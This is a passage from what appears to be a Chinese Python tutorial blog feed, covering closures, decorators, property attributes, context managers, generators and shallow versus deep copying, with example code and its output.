4</code></pre><p><strong>闭包执行结果的说明:</strong></p><p>通过上面的输出结果可以看出闭包保存了外部函数内的变量num1，每次执行闭包都是在num1 = 1 基础上进行计算。</p><h3 id="4-闭包的作用"><a href="#4-闭包的作用" class="headerlink" title="4. 闭包的作用"></a>4. 闭包的作用</h3><ul><li>闭包可以保存外部函数内的变量，不会随着外部函数调用完而销毁。</li></ul><p><strong>注意点:</strong></p><ul><li>由于闭包引用了外部函数的变量，则外部函数的变量没有及时释放，消耗内存。</li></ul><h2 id="二、闭包的使用"><a href="#二、闭包的使用" class="headerlink" title="二、闭包的使用"></a>二、闭包的使用</h2><h3 id="1-案例"><a href="#1-案例" class="headerlink" title="1. 案例"></a>1. 案例</h3><p>需求: 根据配置信息使用闭包实现不同人的对话信息，例如对话:</p><p>张三: 到北京了吗?<br>李四: 已经到了，放心吧。</p><h3 id="2-实现步骤说明"><a href="#2-实现步骤说明" class="headerlink" title="2. 实现步骤说明"></a>2. 实现步骤说明</h3><ol><li>定义外部函数接收不同的配置信息参数，参数是人名</li><li>定义内部函数接收对话信息参数</li><li>在内部函数里面把配置信息和对话信息进行拼接输出</li></ol><h3 id="3-功能代码的实现"><a href="#3-功能代码的实现" class="headerlink" title="3. 功能代码的实现"></a>3. 功能代码的实现</h3><pre><code class="python"># 外部函数def config_name(name):    # 内部函数    def say_info(info):        print(name + &quot;: &quot; + info)    return say_infotom = config_name(&quot;Tom&quot;)tom(&quot;你好!&quot;)tom(&quot;你好, 在吗?&quot;)jerry = config_name(&quot;jerry&quot;)jerry(&quot;不在!&quot;)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">Tom: 你好!Tom: 你好, 在吗?jerry: 不在!</code></pre><p><strong>闭包案例说明:</strong></p><ul><li>闭包还可以提高代码的可重用性，不需要再手动定义额外的功能函数。</li></ul><h3 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h3><ul><li>闭包不仅可以保存外部函数的变量还可以提高代码的可重用行。</li></ul><h2 id="三、修改闭包内使用的外部变量"><a href="#三、修改闭包内使用的外部变量" class="headerlink" title="三、修改闭包内使用的外部变量"></a>三、修改闭包内使用的外部变量</h2><h3 id="1-修改闭包内使用的外部变量"><a href="#1-修改闭包内使用的外部变量" class="headerlink" title="1. 修改闭包内使用的外部变量"></a>1. 修改闭包内使用的外部变量</h3><p><strong>修改闭包内使用的外部变量的错误示例:</strong></p><pre><code class="python"># 定义一个外部函数def func_out(num1):    # 定义一个内部函数    def func_inner(num2):        # 这里本意想要修改外部num1的值，实际上是在内部函数定义了一个局部变量num1        num1 = 10        # 内部函数使用了外部函数的变量(num1)        result = num1 + num2        print(&quot;结果是:&quot;, result)    print(num1)    func_inner(1)    print(num1)    # 外部函数返回了内部函数，这里返回的内部函数就是闭包    return func_inner# 创建闭包实例f = func_out(1)# 执行闭包f(2)</code></pre><p><strong>修改闭包内使用的外部变量的正确示例:</strong></p><pre><code class="python"># 定义一个外部函数def func_out(num1):    # 定义一个内部函数    def func_inner(num2):        # 这里本意想要修改外部num1的值，实际上是在内部函数定义了一个局部变量num1        nonlocal num1  # 告诉解释器，此处使用的是 外部变量a        # 修改外部变量num1        num1 = 10        # 内部函数使用了外部函数的变量(num1)        result = num1 + num2        print(&quot;结果是:&quot;, result)    print(num1)    func_inner(1)    print(num1)    # 外部函数返回了内部函数，这里返回的内部函数就是闭包    return func_inner# 创建闭包实例f = func_out(1)# 执行闭包f(2)</code></pre><h3 id="2-小结"><a href="#2-小结" class="headerlink" title="2. 小结"></a>2. 小结</h3><ul><li>修改闭包内使用的外部函数变量使用 nonlocal 关键字来完成。</li></ul><h2 id="四、装饰器"><a href="#四、装饰器" class="headerlink" title="四、装饰器"></a>四、装饰器</h2><h3 id="1-装饰器的定义"><a href="#1-装饰器的定义" class="headerlink" title="1. 装饰器的定义"></a>1. 装饰器的定义</h3><p>就是<strong>给已有函数增加额外功能的函数，它本质上就是一个闭包函数</strong>。</p><p><strong>装饰器的功能特点:</strong></p><ol><li>不修改已有函数的源代码</li><li>不修改已有函数的调用方式</li><li>给已有函数增加额外的功能</li></ol><h3 id="2-装饰器的示例代码"><a href="#2-装饰器的示例代码" class="headerlink" title="2. 装饰器的示例代码"></a>2. 装饰器的示例代码</h3><pre><code class="python"># 添加一个登录验证的功能def check(fn):    def inner():        print(&quot;请先登录....&quot;)        fn()    return innerdef comment():    print(&quot;发表评论&quot;)# 使用装饰器来装饰函数comment = check(comment)comment()# 装饰器的基本雏形# def decorator(fn): # fn:目标函数.#     def inner():#         &#39;&#39;&#39;执行函数之前&#39;&#39;&#39;#         fn() # 执行被装饰的函数#         &#39;&#39;&#39;执行函数之后&#39;&#39;&#39;#     return inner</code></pre><p><strong>代码说明:</strong></p><ul><li>闭包函数有且只有一个参数，必须是函数类型，这样定义的函数才是装饰器。</li><li>写代码要遵循开放封闭原则，它规定已经实现的功能代码不允许被修改，但可以被扩展。</li></ul><p><strong>执行结果:</strong></p><pre><code class="python">请先登录....发表评论</code></pre><h3 id="3-装饰器的语法糖写法"><a href="#3-装饰器的语法糖写法" class="headerlink" title="3. 装饰器的语法糖写法"></a>3. 装饰器的语法糖写法</h3><p>如果有多个函数都需要添加登录验证的功能，每次都需要编写func = check(func)这样代码对已有函数进行装饰，这种做法还是比较麻烦。</p><p>Python给提供了一个装饰函数更加简单的写法，那就是语法糖，语法糖的书写格式是: @装饰器名字，通过语法糖的方式也可以完成对已有函数的装饰</p><pre><code class="python"># 添加一个登录验证的功能def check(fn):    print(&quot;装饰器函数执行了&quot;)    def inner():        print(&quot;请先登录....&quot;)        fn()    return inner# 使用语法糖方式来装饰函数@checkdef comment():    print(&quot;发表评论&quot;)comment()</code></pre><p><strong>说明:</strong></p><ul><li>@check 等价于 comment = check(comment)</li><li>装饰器的执行时间是加载模块时立即执行。</li></ul><p><strong>执行结果:</strong></p><pre><code class="python">请先登录....发表评论</code></pre><h3 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h3><ul><li><p>装饰器本质上就是一个闭包函数，它可以对已有函数进行额外的功能扩展。</p></li><li><p>装饰器的语法格式:</p><pre><code class="python"># 装饰器# def decorator(fn): # fn:被装饰的目标函数.#     def inner():#         &#39;&#39;&#39;执行函数之前&#39;&#39;&#39;#         fn() # 执行被装饰的目标函数#         &#39;&#39;&#39;执行函数之后&#39;&#39;&#39;#     return inner</code></pre></li><li><p>装饰器的语法糖用法: @装饰器名称，同样可以完成对已有函数的装饰操作。</p></li></ul><h2 id="五、装饰器的作用"><a href="#五、装饰器的作用" class="headerlink" title="五、装饰器的作用"></a>五、装饰器的作用</h2><h3 id="1-装饰器的使用场景"><a href="#1-装饰器的使用场景" class="headerlink" title="1. 装饰器的使用场景"></a>1. 装饰器的使用场景</h3><ol><li>函数执行时间的统计</li><li>输出日志信息</li></ol><h3 id="2-装饰器实现已有函数执行时间的统计"><a href="#2-装饰器实现已有函数执行时间的统计" class="headerlink" title="2. 装饰器实现已有函数执行时间的统计"></a>2. 装饰器实现已有函数执行时间的统计</h3><pre><code class="python">import time# 装饰器函数def get_time(func):    def inner():        begin = time.time()        func()        end = time.time()        print(&quot;函数执行花费%f&quot; % (end-begin))    return inner@get_timedef func1():    for i in range(100000):        print(i)func1()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">...9999599996999979999899999函数执行花费0.329066</code></pre><h2 id="六、通用装饰器的使用"><a href="#六、通用装饰器的使用" class="headerlink" title="六、通用装饰器的使用"></a>六、通用装饰器的使用</h2><h3 id="1-装饰带有参数的函数"><a href="#1-装饰带有参数的函数" class="headerlink" title="1. 装饰带有参数的函数"></a>1. 装饰带有参数的函数</h3><pre><code class="python"># 添加输出日志的功能def logging(fn):    def inner(num1, num2):        print(&quot;--正在努力计算--&quot;)        fn(num1, num2)    return inner# 使用装饰器装饰函数@loggingdef sum_num(a, b):    result = a + b    print(result)sum_num(1, 2)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">--正在努力计算--3</code></pre><h3 id="2-装饰带有返回值的函数"><a href="#2-装饰带有返回值的函数" class="headerlink" title="2. 装饰带有返回值的函数"></a>2. 装饰带有返回值的函数</h3><pre><code class="python"># 添加输出日志的功能def logging(fn):    def inner(num1, num2):        print(&quot;--正在努力计算--&quot;)        result = fn(num1, num2)        return result    return inner# 使用装饰器装饰函数@loggingdef sum_num(a, b):    result = a + b    return resultresult = sum_num(1, 2)print(result)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">--正在努力计算--3</code></pre><h3 id="3-装饰带有不定长参数的函数"><a href="#3-装饰带有不定长参数的函数" class="headerlink" title="3. 装饰带有不定长参数的函数"></a>3. 装饰带有不定长参数的函数</h3><pre><code class="python"># 添加输出日志的功能def logging(fn):    def inner(*args, **kwargs):        print(&quot;--正在努力计算--&quot;)        fn(*args, **kwargs)    return inner# 使用语法糖装饰函数@loggingdef sum_num(*args, **kwargs):    result = 0    for value in args:        result += value    for value in kwargs.values():        result += value    print(result)sum_num(1, 2, a=10)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">--正在努力计算--13</code></pre><h3 id="4-通用装饰器"><a href="#4-通用装饰器" class="headerlink" title="4. 通用装饰器"></a>4. 通用装饰器</h3><pre><code class="python"># 添加输出日志的功能def logging(fn):    def inner(*args, **kwargs):        print(&quot;--正在努力计算--&quot;)        result = fn(*args, **kwargs)        return result    return inner# 使用语法糖装饰函数@loggingdef sum_num(*args, **kwargs):    result = 0    for value in args:        result += value    for value in kwargs.values():        result += value    return result@loggingdef subtraction(a, b):    result = a - b    print(result)result = sum_num(1, 2, a=10)print(result)subtraction(4, 2)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">--正在努力计算--13--正在努力计算--2</code></pre><h3 id="5-小结-1"><a href="#5-小结-1" class="headerlink" title="5. 小结"></a>5. 小结</h3><ul><li><p>通用装饰器的语法格式:</p><pre><code class="python"># 通用装饰器def logging(fn):  def inner(*args, **kwargs):      print(&quot;--正在努力计算--&quot;)      result = fn(*args, **kwargs)      return result  return inner</code></pre></li></ul><h2 id="七、多个装饰器的使用"><a href="#七、多个装饰器的使用" class="headerlink" title="七、多个装饰器的使用"></a>七、多个装饰器的使用</h2><h3 id="1-多个装饰器的使用示例代码"><a href="#1-多个装饰器的使用示例代码" class="headerlink" title="1. 多个装饰器的使用示例代码"></a>1. 多个装饰器的使用示例代码</h3><pre><code class="python">def make_div(func):    &quot;&quot;&quot;对被装饰的函数的返回值 div标签&quot;&quot;&quot;    def inner():        return &quot;&lt;div&gt;&quot; + func() + &quot;&lt;/div&gt;&quot;    return innerdef make_p(func):    &quot;&quot;&quot;对被装饰的函数的返回值 p标签&quot;&quot;&quot;    def inner():        return &quot;&lt;p&gt;&quot; + func() + &quot;&lt;/p&gt;&quot;    return inner# 装饰过程: 1 content = make_p(content) 2 content = make_div(content)# content = make_div(make_p(content))@make_div@make_pdef content():    return &quot;人生苦短&quot;result = content()print(result)</code></pre><p><strong>代码说明:</strong></p><ul><li>多个装饰器的装饰过程是: 离函数最近的装饰器先装饰，然后外面的装饰器再进行装饰，由内到外的装饰过程</li></ul><h2 id="八、带有参数的装饰器"><a href="#八、带有参数的装饰器" class="headerlink" title="八、带有参数的装饰器"></a>八、带有参数的装饰器</h2><h3 id="1-带有参数的装饰器介绍"><a href="#1-带有参数的装饰器介绍" class="headerlink" title="1. 带有参数的装饰器介绍"></a>1. 带有参数的装饰器介绍</h3><p>带有参数的装饰器就是使用装饰器装饰函数的时候可以传入指定参数，<strong>语法格式: @装饰器(参数,…)</strong></p><p><strong>正确写法:</strong></p><p>在装饰器外面再包裹上一个函数，让最外面的函数接收参数，返回的是装饰器，因为@符号后面必须是装饰器实例。</p><pre><code class="python"># 添加输出日志的功能def logging(flag):    def decorator(fn):        def inner(num1, num2):            if flag == &quot;+&quot;:                print(&quot;--正在努力加法计算--&quot;)            elif flag == &quot;-&quot;:                print(&quot;--正在努力减法计算--&quot;)            result = fn(num1, num2)            return result        return inner    # 返回装饰器    return decorator# 使用装饰器装饰函数@logging(&quot;+&quot;)def add(a, b):    result = a + b    return result@logging(&quot;-&quot;)def sub(a, b):    result = a - b    return resultresult = add(1, 2)print(result)result = sub(1, 2)print(result)</code></pre><h3 id="2-小结-1"><a href="#2-小结-1" class="headerlink" title="2. 小结"></a>2. 小结</h3><ul><li>使用带有参数的装饰器，其实是在装饰器外面又包裹了一个函数，使用该函数接收参数，返回是装饰器，因为 @ 符号需要配合装饰器实例使用</li></ul><h2 id="九、类装饰器的使用"><a href="#九、类装饰器的使用" class="headerlink" title="九、类装饰器的使用"></a>九、类装饰器的使用</h2><h3 id="1-类装饰器的介绍"><a href="#1-类装饰器的介绍" class="headerlink" title="1. 类装饰器的介绍"></a>1. 类装饰器的介绍</h3><p>装饰器还有一种特殊的用法就是类装饰器，就是通过定义一个类来装饰函数。</p><p><strong>类装饰器示例代码:</strong></p><pre><code class="python">class Check(object):    def __init__(self, fn):        # 初始化操作在此完成        self.__fn = fn    # 实现__call__方法，表示对象是一个可调用对象，可以像调用函数一样进行调用。    def __call__(self, *args, **kwargs):        # 添加装饰功能        print(&quot;请先登陆...&quot;)        self.__fn()@Checkdef comment():    print(&quot;发表评论&quot;)comment()</code></pre><p><strong>代码说明:</strong></p><ul><li>@Check 等价于 comment = Check(comment), 所以需要提供一个<strong>init</strong>方法，并多增加一个fn参数。</li><li>要想类的实例对象能够像函数一样调用，需要在类里面使用<strong>call</strong>方法，把类的实例变成可调用对象(callable)，也就是说可以像调用函数一样进行调用。</li><li>在<strong>call</strong>方法里进行对fn函数的装饰，可以添加额外的功能。</li></ul><p><strong>执行结果:</strong></p><pre><code class="python">请先登陆...发表评论</code></pre><h3 id="2-小结-2"><a href="#2-小结-2" class="headerlink" title="2. 小结"></a>2. 小结</h3><ul><li>想要让类的实例对象能够像函数一样进行调用，需要在类里面使用<strong>call</strong>方法，把类的实例变成可调用对象(callable)</li><li>类装饰器装饰函数功能在<strong>call</strong>方法里面进行添加</li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级10-正则表达式</title>
      <link href="/2020/08/22/2020-08-23-python%E9%AB%98%E7%BA%A710-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2020/08/22/2020-08-23-python%E9%AB%98%E7%BA%A710-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="一、property属性"><a href="#一、property属性" class="headerlink" title="一、property属性"></a>一、property属性</h2><h3 id="1-property属性的介绍"><a href="#1-property属性的介绍" class="headerlink" title="1. property属性的介绍"></a>1. property属性的介绍</h3><p>property属性就是负责把一个方法当做属性进行使用，这样做可以简化代码使用。</p><a id="more"></a><p><strong>定义property属性有两种方式</strong></p><ol><li>装饰器方式</li><li>类属性方式</li></ol><h3 id="2-装饰器方式"><a href="#2-装饰器方式" class="headerlink" title="2. 装饰器方式"></a>2. 装饰器方式</h3><pre><code class="python">class Person(object):    def __init__(self):        self.__age = 0    # 装饰器方式的property, 把age方法当做属性使用, 表示当获取属性时会执行下面修饰的方法    @property    def age(self):        return self.__age    # 把age方法当做属性使用, 表示当设置属性时会执行下面修饰的方法    @age.setter    def age(self, new_age):        if new_age &gt;= 150:            print(&quot;成精了&quot;)        else:            self.__age = new_age# 创建personp = Person()print(p.age)p.age = 100print(p.age)p.age = 1000</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">0100成精了</code></pre><p><strong>代码说明:</strong></p><ul><li>@property 表示把方法当做属性使用, 表示当获取属性时会执行下面修饰的方法</li><li>@方法名.setter 表示把方法当做属性使用,表示当设置属性时会执行下面修饰的方法</li><li>装饰器方式的property属性修饰的方法名一定要一样。</li></ul><h3 id="3-类属性方式"><a href="#3-类属性方式" class="headerlink" title="3. 类属性方式"></a>3. 类属性方式</h3><pre><code class="python">class Person(object):    def __init__(self):        self.__age = 0    def get_age(self):        &quot;&quot;&quot;当获取age属性的时候会执行该方法&quot;&quot;&quot;        return self.__age    def set_age(self, new_age):        &quot;&quot;&quot;当设置age属性的时候会执行该方法&quot;&quot;&quot;        if new_age &gt;= 150:            print(&quot;成精了&quot;)        else:            self.__age = new_age    # 类属性方式的property属性    age = property(get_age, set_age)# 创建personp = Person()print(p.age)p.age = 100print(p.age)p.age = 1000</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">0100成精了</code></pre><p><strong>代码说明:</strong></p><ul><li>property的参数说明:<ul><li>第一个参数是获取属性时要执行的方法</li><li>第二个参数是设置属性时要执行的方法</li></ul></li></ul><h2 id="二、with语句和上下文管理器"><a href="#二、with语句和上下文管理器" class="headerlink" title="二、with语句和上下文管理器"></a>二、with语句和上下文管理器</h2><h3 id="1-with语句的使用"><a href="#1-with语句的使用" class="headerlink" title="1. with语句的使用"></a>1. with语句的使用</h3><p><strong>基础班向文件中写入数据的示例代码:</strong></p><pre><code class="python"> # 1、以写的方式打开文件 f = open(&quot;1.txt&quot;, &quot;w&quot;) # 2、写入文件内容 f.write(&quot;hello world&quot;) # 3、关闭文件 f.close()</code></pre><p><strong>代码说明:</strong></p><ul><li>文件使用完后必须关闭，因为文件对象会占用操作系统的资源，并且操作系统同一时间能打开的文件数量也是有限的</li></ul><p><strong>这种写法可能出现一定的安全隐患，错误代码如下:</strong></p><pre><code class="python"> # 1、以读的方式打开文件 f = open(&quot;1.txt&quot;, &quot;r&quot;) # 2、读取文件内容 f.write(&quot;hello world&quot;) # 3、关闭文件 f.close()</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">Traceback (most recent call last):  File &quot;/home/python/Desktop/test/xxf.py&quot;, line 4, in &lt;module&gt;    f.write(&quot;hello world&quot;)io.UnsupportedOperation: not writable</code></pre><p><strong>代码说明:</strong></p><ul><li>由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。</li><li>为了保证无论是否出错都能正确地关闭文件，我们可以使用try … finally来解决</li></ul><p><strong>安全写法, 代码如下:</strong></p><pre><code class="python">try:    # 1、以读的方式打开文件    f = open(&quot;1.txt&quot;, &quot;r&quot;)    # 2、读取文件内容    f.write(&quot;xxxxx&quot;)except IOError as e:    print(&quot;文件操作出错&quot;, e)finally:    # 3、关闭文件    f.close()</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">文件操作出错 not writable</code></pre><p>这种方法虽然代码运行良好,但是缺点就是代码过于冗长,并且需要添加try-except-finally语句,不是很方便,也容易忘记.</p><p>在这种情况下,<strong>Python提供了 with 语句的这种写法，既简单又安全，并且 with 语句执行完成以后自动调用关闭文件操作，即使出现异常也会自动调用关闭文件操作</strong>。</p><p><strong>with 语句的示例代码:</strong></p><pre><code class="python"># 1、以写的方式打开文件with open(&quot;1.txt&quot;, &quot;w&quot;) as f:    # 2、读取文件内容    f.write(&quot;hello world&quot;)</code></pre><h3 id="2-上下文管理器"><a href="#2-上下文管理器" class="headerlink" title="2. 上下文管理器"></a>2. 上下文管理器</h3><p>一个类只要实现了<code>__enter__()和__exit__()</code>这个两个方法，通过该类创建的对象我们就称之为上下文管理器。</p><p>上下文管理器可以使用 with 语句，<strong>with语句之所以这么强大，背后是由上下文管理器做支撑的</strong>，也就是说刚才使用 open 函数创建的文件对象就是就是一个上下文管理器对象。</p><p><strong>自定义上下文管理器类,模拟文件操作:</strong></p><p>定义一个File类，实现 <code>__enter__() 和 __exit__()</code>方法，然后使用 with 语句来完成操作文件， 示例代码:</p><pre><code class="python">class File(object):    # 初始化方法    def __init__(self, file_name, file_model):        # 定义变量保存文件名和打开模式        self.file_name = file_name        self.file_model = file_model    # 上文方法    def __enter__(self):        print(&quot;进入上文方法&quot;)        # 返回文件资源        self.file = open(self.file_name,self.file_model)        return self.file    # 下文方法    def __exit__(self, exc_type, exc_val, exc_tb):        print(&quot;进入下文方法&quot;)        self.file.close()if __name__ == &#39;__main__&#39;:    # 使用with管理文件    with File(&quot;1.txt&quot;, &quot;r&quot;) as file:        file_data = file.read()        print(file_data)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">进入上文方法hello world进入下文方法</code></pre><p><strong>代码说明:</strong></p><ul><li><code>__enter__</code>表示上文方法，需要返回一个操作文件对象</li><li><code>__exit__</code>表示下文方法，with语句执行完成会自动执行，即使出现异常也会执行该方法。</li></ul><h2 id="三、生成器的创建方式"><a href="#三、生成器的创建方式" class="headerlink" title="三、生成器的创建方式"></a>三、生成器的创建方式</h2><h3 id="1-生成器的介绍"><a href="#1-生成器的介绍" class="headerlink" title="1. 生成器的介绍"></a>1. 生成器的介绍</h3><p>根据程序员制定的规则循环生成数据，当条件不成立时则生成数据结束。数据不是一次性全部生成出来，而是使用一个，再生成一个，可以<strong>节约大量的内存</strong>。</p><h3 id="2-创建生成器的方式"><a href="#2-创建生成器的方式" class="headerlink" title="2. 创建生成器的方式"></a>2. 创建生成器的方式</h3><ol><li>生成器推导式</li><li>yield 关键字</li></ol><p><strong>生成器推导式:</strong></p><ul><li>与列表推导式类似，只不过生成器推导式使用小括号</li></ul><pre><code class="python"># 创建生成器my_generator = (i * 2 for i in range(5))print(my_generator)# next获取生成器下一个值# value = next(my_generator)# print(value)# 遍历生成器for value in my_generator:    print(value)</code></pre><p><strong>代码说明:</strong></p><ul><li>next 函数获取生成器中的下一个值</li><li>for 循环遍历生成器中的每一个值</li></ul><p><strong>运行结果:</strong></p><pre><code class="python">&lt;generator object &lt;genexpr&gt; at 0x101367048&gt;02468</code></pre><p><strong>yield 关键字:</strong></p><ul><li>只要在def函数里面看到有 yield 关键字那么就是生成器</li></ul><pre><code class="python">def mygenerater(n):    for i in range(n):        print(&#39;开始生成...&#39;)        yield i        print(&#39;完成一次...&#39;)if __name__ == &#39;__main__&#39;:    g = mygenerater(2)    # 获取生成器中下一个值    # result = next(g)    # print(result)    # while True:    #     try:    #         result = next(g)    #         print(result)    #     except StopIteration as e:    #         break    # # for遍历生成器, for 循环内部自动处理了停止迭代异常，使用起来更加方便    for i in g:        print(i)</code></pre><p><strong>代码说明:</strong></p><ul><li>代码执行到 yield 会暂停，然后把结果返回出去，下次启动生成器会在暂停的位置继续往下执行</li><li>生成器如果把数据生成完成，再次获取生成器中的下一个数据会抛出一个StopIteration 异常，表示停止迭代异常</li><li>while 循环内部没有处理异常操作，需要手动添加处理异常操作</li><li>for 循环内部自动处理了停止迭代异常，使用起来更加方便，推荐大家使用。</li></ul><p><strong>运行结果:</strong></p><pre><code class="python">开始生成...0完成一次...开始生成...1完成一次...</code></pre><h3 id="3-生成器的使用场景"><a href="#3-生成器的使用场景" class="headerlink" title="3. 生成器的使用场景"></a>3. 生成器的使用场景</h3><p>数学中有个著名的斐波拉契数列（Fibonacci），数列中第一个数为0，第二个数为1，其后的每一个数都可由前两个数相加得到：</p><p>0, 1, 1, 2, 3, 5, 8, 13, 21, 34, …</p><p>现在我们使用生成器来实现这个斐波那契数列，每次取值都通过算法来生成下一个数据, <strong>生成器每次调用只生成一个数据，可以节省大量的内存。</strong></p><pre><code class="python">def fibonacci(num):    a = 0    b = 1    # 记录生成fibonacci数字的下标    current_index = 0    while current_index &lt; num:        result = a        a, b = b, a + b        current_index += 1        # 代码执行到yield会暂停，然后把结果返回出去，下次启动生成器会在暂停的位置继续往下执行        yield resultfib = fibonacci(5)# 遍历生成的数据for value in fib:    print(value)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">01123</code></pre><h2 id="四、深拷贝和浅拷贝"><a href="#四、深拷贝和浅拷贝" class="headerlink" title="四、深拷贝和浅拷贝"></a>四、深拷贝和浅拷贝</h2><h3 id="1-浅拷贝"><a href="#1-浅拷贝" class="headerlink" title="1. 浅拷贝"></a>1. 浅拷贝</h3><p>copy函数是浅拷贝，只对可变类型的第一层对象进行拷贝，对拷贝的对象开辟新的内存空间进行存储，不会拷贝对象内部的子对象。</p><p><strong>不可变类型的浅拷贝示例代码:</strong></p><pre><code class="python">import copy  # 使用浅拷贝需要导入copy模块# 不可变类型有: 数字、字符串、元组a1 = 123123b1 = copy.copy(a1)  # 使用copy模块里的copy()函数就是浅拷贝了# 查看内存地址print(id(a1))print(id(b1))print(&quot;-&quot; * 10)a2 = &quot;abc&quot;b2 = copy.copy(a2)# 查看内存地址print(id(a2))print(id(b2))print(&quot;-&quot; * 10)a3 = (1, 2, [&quot;hello&quot;, &quot;world&quot;])b3 = copy.copy(a3)# 查看内存地址print(id(a3))print(id(b3))</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">140459558944048140459558944048----------140459558648776140459558648776----------140459558073328140459558073328</code></pre><p><strong>不可变类型的浅拷贝说明:</strong></p><ul><li><strong>通过上面的执行结果可以得知，不可变类型进行浅拷贝不会给拷贝的对象开辟新的内存空间，而只是拷贝了这个对象的引用。</strong></li></ul><p><strong>可变类型的浅拷贝示例代码:</strong></p><pre><code class="python">import copy # 使用浅拷贝需要导入copy模块# 可变类型有: 列表、字典、集合a1 = [1, 2]b1 = copy.copy(a1) # 使用copy模块里的copy()函数就是浅拷贝了# 查看内存地址print(id(a1))print(id(b1))print(&quot;-&quot; * 10)a2 = {&quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 20}b2 = copy.copy(a2)# 查看内存地址print(id(a2))print(id(b2))print(&quot;-&quot; * 10)a3 = {1, 2, &quot;王五&quot;}b3 = copy.copy(a3)# 查看内存地址print(id(a3))print(id(b3))print(&quot;-&quot; * 10)a4 = [1, 2, [4, 5]]# 注意：浅拷贝只会拷贝父对象，不会对子对象进行拷贝b4 = copy.copy(a4) # 使用copy模块里的copy()函数就是浅拷贝了# 查看内存地址print(id(a4))print(id(b4))print(&quot;-&quot; * 10)# 查看内存地址print(id(a4[2]))print(id(b4[2]))# 修改数据a4[2][0] = 6# 子对象的数据会受影响print(a4)print(b4)</code></pre><p><strong>运行结果:</strong></p><pre><code class="py">139882899585608139882899585800----------139882919626432139882919626504----------139882919321672139882899616264----------139882899587016139882899586952----------139882899693640139882899693640[1, 2, [6, 5]][1, 2, [6, 5]]</code></pre><p><strong>可变类型的浅拷贝说明:</strong></p><ul><li><strong>通过上面的执行结果可以得知，可变类型进行浅拷贝只对可变类型的第一层对象进行拷贝，对拷贝的对象会开辟新的内存空间进行存储，子对象不进行拷贝。</strong></li></ul><h3 id="2-深拷贝"><a href="#2-深拷贝" class="headerlink" title="2. 深拷贝"></a>2. 深拷贝</h3><p>deepcopy函数是深拷贝, 只要发现对象有可变类型就会对该对象到最后一个可变类型的每一层对象就行拷贝, 对每一层拷贝的对象都会开辟新的内存空间进行存储。</p><p><strong>不可变类型的深拷贝示例代码:</strong></p><pre><code class="python">import copy  # 使用深拷贝需要导入copy模块# 不可变类型有: 数字、字符串、元组a1 = 1b1 = copy.deepcopy(a1)  # 使用copy模块里的deepcopy()函数就是深拷贝了# 查看内存地址print(id(a1))print(id(b1))print(&quot;-&quot; * 10)a2 = &quot;张三&quot;b2 = copy.deepcopy(a2)# 查看内存地址print(id(a2))print(id(b2))print(&quot;-&quot; * 10)a3 = (1, 2)b3 = copy.deepcopy(a3)# 查看内存地址print(id(a3))print(id(b3))print(&quot;-&quot; * 10)# 注意: 元组里面要是有可变类型对象，发现对象有可变类型就会该对象到最后一个可变类型的每一层对象进行拷贝a4 = (1, [&quot;李四&quot;])b4 = copy.deepcopy(a4)# 查看内存地址print(id(a4))print(id(b4))# 元组里面的可变类型子对象也会进行拷贝print(id(a4[1]))print(id(b4[1]))</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">92891209289120----------140115621848320140115621848320----------140115621859592140115621859592----------140115602480584140115621834568140115602328136140115602436168</code></pre><p><strong>不可变类型的深拷贝说明:</strong></p><ul><li>通过上面的执行结果可以得知：<ul><li><strong>不可变类型进行深拷贝如果子对象没有可变类型则不会进行拷贝，而只是拷贝了这个对象的引用，否则会对该对象到最后一个可变类型的每一层对象就行拷贝, 对每一层拷贝的对象都会开辟新的内存空间进行存储</strong></li></ul></li></ul><p><strong>可变类型的深拷贝示例代码:</strong></p><pre><code class="python">import copy  # 使用深拷贝需要导入copy模块# 可变类型有: 列表、字典、集合a1 = [1, 2]b1 = copy.deepcopy(a1)  # 使用copy模块里的deepcopy()函数就是深拷贝了# 查看内存地址print(id(a1))print(id(b1))print(&quot;-&quot; * 10)a2 = {&quot;name&quot;: &quot;张三&quot;}b2 = copy.deepcopy(a2)# 查看内存地址print(id(a2))print(id(b2))print(&quot;-&quot; * 10)a3 = {1, 2}b3 = copy.deepcopy(a3)# 查看内存地址print(id(a3))print(id(b3))print(&quot;-&quot; * 10)a4 = [1, 2, [&quot;李四&quot;, &quot;王五&quot;]]b4 = copy.deepcopy(a4)  # 使用copy模块里的deepcopy()函数就是深拷贝了# 查看内存地址print(id(a4))print(id(b4))# 查看内存地址print(id(a4[2]))print(id(b4[2]))a4[2][0] = &quot;王五&quot;# 因为列表的内存地址不同，所以数据不会收到影响print(a4)print(b4)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">140348291721736140348291721928----------140348311762624140348311221592----------140348311457864140348291752456----------140348291723080140348291723144140348291723208140348291723016[1, 2, [&#39;王五&#39;, &#39;王五&#39;]][1, 2, [&#39;李四&#39;, &#39;王五&#39;]]</code></pre><p><strong>可变类型的深拷贝说明:</strong></p><ul><li>通过上面的执行结果可以得知, 可变类型进行深拷贝会对该对象到最后一个可变类型的每一层对象就行拷贝, 对每一层拷贝的对象都会开辟新的内存空间进行存储。</li></ul><h3 id="3-浅拷贝和深拷贝的区别"><a 